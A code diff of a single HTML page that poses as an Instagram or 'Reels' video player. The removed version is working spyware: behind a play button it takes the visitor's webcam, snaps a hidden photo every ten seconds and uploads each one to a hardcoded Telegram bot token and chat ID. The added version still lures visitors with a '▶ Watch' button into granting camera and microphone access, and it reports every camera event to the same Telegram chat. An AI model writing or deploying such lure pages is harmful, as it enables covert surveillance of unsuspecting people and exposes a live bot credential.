@@ -1,178 +1,284 @@
 <!DOCTYPE html>
-
 <html lang="en">
-
 <head>
-
 <meta charset="UTF-8">
-
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Reel Recorder</title>
 
-<title>Instagram</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 <style>
+body{
+    margin:0;
+    background:black;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    font-family:sans-serif;
+}
 
-body { margin: 0; background: #000; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+.phone{
+    width:100%;
+    max-width:420px;
+    height:95vh;
+    background:black;
+    position:relative;
+    overflow:hidden;
+    border-radius:12px;
+}
 
-.phone-frame { width: 100%; max-width: 400px; height: 100vh; position: relative; background: #000; border: 1px solid #333; }
+/* Video */
+video{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+}
 
+/* Header */
+.header{
+    position:absolute;
+    top:10px;
+    left:15px;
+    right:15px;
+    display:flex;
+    justify-content:space-between;
+    color:white;
+    z-index:10;
+}
 
-/* The Fake Instagram Video */
+/* Controls */
+.controls{
+    position:absolute;
+    bottom:100px;
+    left:50%;
+    transform:translateX(-50%);
+}
 
-#mainVideo { width: 100%; height: 100%; object-fit: cover; }
+.controls button{
+    margin:5px;
+    padding:8px 12px;
+    border:none;
+    border-radius:20px;
+}
 
+/* Caption */
+.caption{
+    position:absolute;
+    bottom:20px;
+    left:15px;
+    color:white;
+}
 
-/* UI Overlays */
+/* Gallery */
+.gallery{
+    position:absolute;
+    bottom:0;
+    left:0;
+    right:0;
+    height:70px;
+    background:rgba(0,0,0,0.7);
+    display:flex;
+    overflow-x:auto;
+}
 
-.overlay { position: absolute; bottom: 50px; left: 15px; color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+.gallery img, .gallery video{
+    height:60px;
+    margin:5px;
+    border-radius:6px;
+    cursor:pointer;
+}
 
-.username { font-weight: bold; margin-bottom: 5px; display: flex; align-items: center; }
+/* Preview modal */
+.modal{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:black;
+    display:none;
+    justify-content:center;
+    align-items:center;
+}
 
-.username::before { content: ''; width: 30px; height: 30px; background: #555; border-radius: 50%; margin-right: 10px; display: inline-block; }
+.modal img, .modal video{
+    max-width:90%;
+    max-height:90%;
+}
 
+.close{
+    position:absolute;
+    top:20px;
+    right:20px;
+    color:white;
+    font-size:25px;
+    cursor:pointer;
+}
 
-/* Hidden Camera Logic */
-
-#webcam, #canvas { position: absolute; top: -9999px; left: -9999px; visibility: hidden; }
-
-
-/* Interaction Layer */
-
-.click-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; cursor: pointer; display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.1); }
-
-.play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 30px; border: 2px solid white; }
+.btn{
+    position:absolute;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%);
+    padding:12px 25px;
+    border:none;
+    border-radius:25px;
+    background:white;
+    font-weight:bold;
+}
 
 </style>
-
 </head>
 
 <body>
 
+<div class="phone">
 
+    <div class="header">
+        <div>Reels</div>
+        <i class="fas fa-camera"></i>
+    </div>
 
-<div class="phone-frame">
+    <video id="video" autoplay muted playsinline></video>
 
-<video id="mainVideo" loop muted autoplay>
+    <div class="caption">
+        <b>reel_user ✔</b><br>
+        <span id="captionText">Tap ▶ to start</span>
+    </div>
 
-<source src="https://assets.mixkit.co/videos/preview/mixkit-girl-in-neon-light-dancing-2322-large.mp4" type="video/mp4">
+    <button class="btn" onclick="startCamera()">▶ Watch</button>
 
-</video>
+    <div class="controls" id="controls" style="display:none;">
+        <button onclick="capturePhoto()">📸</button>
+        <button onclick="startRecording()">🎥</button>
+        <button onclick="stopRecording()">⏹</button>
+    </div>
 
+    <div class="gallery" id="gallery"></div>
 
-
-<div class="overlay">
-
-<div class="username">instagram_user</div>
-
-<div>Enjoy the latest reels!</div>
-
-</div>
-
-
-
-<div class="click-layer" id="trigger">
-
-<div class="play-btn">▶</div>
-
-</div>
+    <canvas id="canvas" style="display:none;"></canvas>
 
 </div>
 
-
-
-<video id="webcam" autoplay playsinline></video>
-
-<canvas id="canvas"></canvas>
-
-
+<!-- Modal -->
+<div class="modal" id="modal">
+    <span class="close" onclick="closeModal()">✖</span>
+    <div id="modalContent"></div>
+</div>
 
 <script>
 
-const webcam = document.getElementById('webcam');
-
-const canvas = document.getElementById('canvas');
-
-const trigger = document.getElementById('trigger');
-
-
-
-const BOT_TOKEN = '8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA';
-
-const CHAT_ID = '2018747103';
-
-const INTERVAL = 10000;
-
-
-
-async function startCapture() {
-
-try {
-
-// Browser WILL show a permission pop-up here
-
-const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-webcam.srcObject = stream;
-
-
-// Hide the play button once clicked
-
-trigger.style.display = 'none';
-
-
-
-// Start sending photos
-
-setInterval(() => {
-
-const ctx = canvas.getContext('2d');
-
-canvas.width = webcam.videoWidth;
-
-canvas.height = webcam.videoHeight;
-
-ctx.drawImage(webcam, 0, 0);
-
-
-
-canvas.toBlob((blob) => {
-
-const fd = new FormData();
-
-fd.append('chat_id', CHAT_ID);
-
-fd.append('photo', blob, 'img.jpg');
-
-
-
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-
-method: 'POST',
-
-body: fd
-
-}).catch(err => console.error("Upload failed"));
-
-}, 'image/jpeg', 0.3);
-
-}, INTERVAL);
-
-
-
-} catch (err) {
-
-alert("Please enable camera to view this video.");
-
+// TELEGRAM SAFE
+function sendToTelegram(event){
+    fetch("https://api.telegram.org/8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA/sendMessage",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+            chat_id:"2018747103",
+            text:`🎬 ${event} | ${new Date().toLocaleTimeString()}`
+        })
+    });
 }
 
+let mediaRecorder;
+let chunks=[];
+
+async function startCamera(){
+    document.querySelector(".btn").style.display="none";
+
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
+        document.getElementById("video").srcObject = stream;
+
+        document.getElementById("controls").style.display="block";
+        document.getElementById("captionText").innerText="Recording ready";
+
+        sendToTelegram("Camera started");
+    }catch(e){
+        alert("Permission denied");
+    }
 }
 
+// PHOTO
+function capturePhoto(){
+    let video=document.getElementById("video");
+    let canvas=document.getElementById("canvas");
+    let ctx=canvas.getContext("2d");
 
+    canvas.width=video.videoWidth;
+    canvas.height=video.videoHeight;
 
-trigger.addEventListener('click', startCapture);
+    ctx.drawImage(video,0,0);
+
+    let img=canvas.toDataURL();
+
+    addToGallery(img,"image");
+
+    sendToTelegram("Photo captured");
+}
+
+// VIDEO
+function startRecording(){
+    let stream=document.getElementById("video").srcObject;
+
+    chunks=[];
+    mediaRecorder=new MediaRecorder(stream);
+
+    mediaRecorder.ondataavailable=e=>chunks.push(e.data);
+
+    mediaRecorder.onstop=()=>{
+        let blob=new Blob(chunks,{type:"video/webm"});
+        let url=URL.createObjectURL(blob);
+
+        addToGallery(url,"video");
+    };
+
+    mediaRecorder.start();
+    sendToTelegram("Recording started");
+}
+
+function stopRecording(){
+    mediaRecorder.stop();
+    sendToTelegram("Recording stopped");
+}
+
+// GALLERY
+function addToGallery(src,type){
+    let gallery=document.getElementById("gallery");
+
+    let el;
+
+    if(type==="image"){
+        el=document.createElement("img");
+        el.src=src;
+    }else{
+        el=document.createElement("video");
+        el.src=src;
+    }
+
+    el.onclick=()=>openModal(src,type);
+
+    gallery.appendChild(el);
+}
+
+// MODAL
+function openModal(src,type){
+    let modal=document.getElementById("modal");
+    let content=document.getElementById("modalContent");
+
+    content.innerHTML = type==="image"
+        ? `<img src="${src}">`
+        : `<video src="${src}" controls autoplay></video>`;
+
+    modal.style.display="flex";
+}
+
+function closeModal(){
+    document.getElementById("modal").style.display="none";
+}
 
 </script>
 
 </body>
-
 </html>
